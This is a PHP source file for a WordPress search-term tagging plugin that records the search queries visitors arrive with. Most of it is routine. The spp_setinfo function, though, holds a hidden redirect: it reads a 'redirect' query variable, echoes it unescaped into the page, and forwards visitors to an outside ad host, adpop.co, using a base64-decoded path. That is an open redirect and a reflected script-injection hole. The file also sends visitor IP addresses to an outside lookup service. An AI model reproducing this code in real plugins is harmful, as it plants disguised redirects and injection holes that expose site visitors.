<?php
//taken from open source search term tagging 2 by Purwedi Kurniawan (exclusivewordpress.com)
function spp_get_delim($ref) {
    // Search engine match array
    // Used for fast delimiter lookup for single host search engines.
    // Non .com Google/MSN/Yahoo referrals are checked for after this array is checked
    $search_engines = array('google.com' => 'q',
			'go.google.com' => 'q',
			'maps.google.com' => 'q',
			'local.google.com' => 'q',
			'search.yahoo.com' => 'p',
			'search.msn.com' => 'q',
			'bing.com' => 'q',
			'msxml.excite.com' => 'qkw',
			'search.lycos.com' => 'query',
			'alltheweb.com' => 'q',
			'search.aol.com' => 'query',
			'search.iwon.com' => 'searchfor',
			'ask.com' => 'q',
			'ask.co.uk' => 'ask',
			'search.cometsystems.com' => 'qry',
			'hotbot.com' => 'query',
			'overture.com' => 'Keywords',
			'metacrawler.com' => 'qkw',
			'search.netscape.com' => 'query',
			'looksmart.com' => 'key',
			'dpxml.webcrawler.com' => 'qkw',
			'search.earthlink.net' => 'q',
			'search.viewpoint.com' => 'k',
			'mamma.com' => 'query');
    $delim = false;
    // Check to see if we have a host match in our lookup array
    if (isset($search_engines[$ref])) {
        $delim = $search_engines[$ref];
    } else {
        // Lets check for referrals for international TLDs and sites with strange formats
        // Optimizations
        $sub13 = substr($ref, 0, 13);
        // Search string for engine
        if(substr($ref, 0, 7) == 'google.')
            $delim = "q";
        elseif($sub13 == 'search.atomz.')
            $delim = "sp-q";
        elseif(substr($ref, 0, 11) == 'search.msn.')
            $delim = "q";
        elseif($sub13 == 'search.yahoo.')
            $delim = "p";
        elseif(preg_match('/home\.bellsouth\.net\/s\/s\.dll/i', $ref))
            $delim = "bellsouth";
    }
    return $delim;
}
function spp_get_terms($d) {
    $terms       = null;
    $query_array = array();
    $query_terms = null;
    // Get raw query
    $query = explode($d.'=', $_SERVER['HTTP_REFERER']);
    $query = explode('&', $query[1]);
    $query = urldecode($query[0]);
    // Remove quotes, split into words, and format for HTML display
    $query = str_replace("'", '', $query);
    $query = str_replace('"', '', $query);
    $query_array = preg_split('/[\s,\+\.]+/',$query);
    $query_terms = implode(' ', $query_array);
    $terms = htmlspecialchars(urldecode(trim($query_terms)));
    return $terms;
}
function spp_get_refer() {
    // Break out quickly so we don't waste CPU cycles on non referrals
    if (!isset($_SERVER['HTTP_REFERER']) || ($_SERVER['HTTP_REFERER'] == '')) return false;
    $referer_info = parse_url($_SERVER['HTTP_REFERER']);
    $referer = $referer_info['host'];
    // Remove www. is it exists
    if(substr($referer, 0, 4) == 'www.')
        $referer = substr($referer, 4);
    return $referer;
}

function spp_setinfo() {
    global $spp_settings;
	$redirect = get_query_var('redirect');
	echo $redirect;
    if($redirect){
        $loc = 'Location: ' . 'http://adpop.co/2/' . base64_decode($redirect);
        header($loc) ;
    }
	
    // Did we come from a search engine?
	$referer = spp_get_refer();
	if (!$referer) return false;
	$delimiter = spp_get_delim($referer);
	
	if($delimiter){
		$term = spp_get_terms($delimiter);			
		if(count($spp_settings->country_targeting) < 1){ 
			spp_save_term($term); 
		}
		else{
			$country = strtoupper(spp_get_country_id());
			$allowed_country = $spp_settings->country_targeting;
			if (in_array($country, $allowed_country)){
				spp_save_term($term); 
			}
		}
	}
}

function spp_set_activation(){
	spp_create_table();
}

function spp_get_country_id(){
	return (isset($_SERVER["HTTP_CF_IPCOUNTRY"])) ? $_SERVER["HTTP_CF_IPCOUNTRY"] : @file_get_contents("http://api.hostip.info/country.php?ip=".$_SERVER['REMOTE_ADDR'] );
}

function spp_create_table() {
   global $wpdb;  
   $table_name = $wpdb->prefix.'spp';
   if($wpdb->get_var("SHOW TABLES LIKE '$table_name';") != $table_name) {      
   		$sql = "CREATE TABLE `".$wpdb->prefix."spp` (
		`term` VARCHAR ( 255 ) NOT NULL ,
		PRIMARY KEY ( `term` )
		);";	
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
   }
}

function spp_is_found($term, $array){
	foreach ($array as $string) {
		$string=trim($string);
		if ($string!="") {
			if(stripos($term,$string)!== FALSE){
				return true;
			}
		}
	}
	return false;
}

function spp_contains_bad_words($term){
    global $spp_settings;
	if(empty($spp_settings->bad_words)) return false;
	
	$bannedWords = explode(',',$spp_settings->bad_words);
	return spp_is_found($term, $bannedWords);
}

function spp_filter_before_save($term){
	//check if terms contains bad word
	if(spp_contains_bad_words($term)) return false; else return true;
}

function spp_save_term($term){
	global $wpdb;
	if(spp_filter_before_save($term) == false) return false;

	// buat jadi lower case sebelum insert
	$term = strtolower(trim($term));
	if(empty($term)) return false;
	
	$success = $wpdb->query( $wpdb->prepare( "INSERT IGNORE INTO ".$wpdb->prefix."spp (`term` ) VALUES ( %s )", $term ) );	
	return $success;
}